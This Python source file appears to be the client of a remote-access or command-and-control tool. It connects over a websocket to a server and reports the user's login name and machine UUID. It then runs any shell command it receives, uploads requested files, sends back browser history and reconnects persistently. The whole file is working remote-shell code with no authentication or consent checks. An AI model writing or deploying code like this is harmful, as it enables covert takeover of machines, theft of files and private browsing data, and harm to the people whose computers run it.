import asyncio
import json
import platform
import ssl

# import ssl

import websockets
import os
import subprocess
import time

from browser.monitor_website import fetch_hist
from utils import handle_cd, download_file, handle_ls

operating_system = platform.system().lower()


async def start_client():
    # ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    # ssl_context.load_verify_locations(cafile='./server.crt')
    uri = "ws://127.0.0.1:8001/ws/client"

    while True:
        try:
            async with websockets.connect(uri) as websocket:
                active = 0

                # get client details for admin.
                await websocket.send(".%.")
                time.sleep(0.001)
                username = os.getlogin()
                system_uuid = get_system_uuid()
                response = {"username": username, "system_uuid": system_uuid}
                await websocket.send(json.dumps(response))

                while True:
                    print("Active status: ", active)
                    try:
                        while not active:
                            print("waiting")
                            command = await websocket.recv()
                            active = command
                            time.sleep(0.001)
                            username = os.getlogin()
                            system_uuid = get_system_uuid()
                            await websocket.send(f"cwd%`{os.getcwd()}")
                            time.sleep(0.001)
                            response = {"username": username, "system_uuid": system_uuid}
                            await websocket.send(json.dumps(response))
                            continue

                        time.sleep(0.001)
                        # Receive command from the server
                        command = await websocket.recv()

                        if command.lower().startswith('switch'):
                            print("switched")
                            active = 0
                            continue
                        elif command.lower().startswith('%*&#!download'):
                            # Extracting filename from the command
                            _, filepath = command.split(' ', 1)
                            print(f"receive filepath {filepath}")
                            await websocket.send(f"%*&#!download {filepath}")

                            await download_file(websocket, filepath=f"{os.getcwd()}/{filepath}")
                            continue
                        elif command.lower().startswith('history'):
                            await websocket.send("history")
                            hist = fetch_hist()
                            await websocket.send(hist)
                            continue

                        cd_result = handle_cd(command)
                        if cd_result:
                            # response = modify_result(result.stdout)
                            await websocket.send("ls")
                            time.sleep(0.001)
                            await websocket.send(json.dumps(cd_result))
                            continue

                        result = subprocess.run(command, shell=True, capture_output=True, text=True)

                        # Handle if the command returns nothing
                        if result.stdout == "":
                            await websocket.send("Null")
                            continue

                        # Send the result back to the server
                        if command.lower().startswith('ls'):
                            cwd = os.getcwd()
                            response = handle_ls(result)
                            response['cwd'] = cwd
                            # response = modify_result(result.stdout)
                            await websocket.send("ls")
                            time.sleep(0.001)
                            await websocket.send(json.dumps(response))
                            continue

                        await websocket.send(result.stdout)
                        continue

                    except Exception as e:
                        # Send any errors back to the server
                        await websocket.send(str(e))
                        continue
        except websockets.exceptions.ConnectionClosedError:
            print("Connection closed. Retrying in 3 seconds...")
            time.sleep(3)
        except Exception as e:
            print(f"Connection failed: {e}")
            print("Retrying in 3 seconds...")
            time.sleep(3)
        finally:
            print("Closing connection")


def get_system_uuid():
    if operating_system == 'linux':
        try:
            with open('/etc/machine-id', 'r') as file:
                return file.read().strip()
        except FileNotFoundError:
            return None

    elif operating_system == 'windows':
        # result = subprocess.run(
        #     ['reg', 'query', 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography', '/v', 'MachineGuid'],
        #     capture_output=True, text=True)
        # return result.stdout.strip().split()[-1].strip()
        try:
            result = subprocess.run(["wmic", "csproduct", "get", "UUID"], capture_output=True, text=True)
            output = result.stdout.strip().split("\n")[-1].strip()
            return output
        except subprocess.CalledProcessError as e:
            print(e)
            return None

    return None


if __name__ == "__main__":
    asyncio.run(start_client())
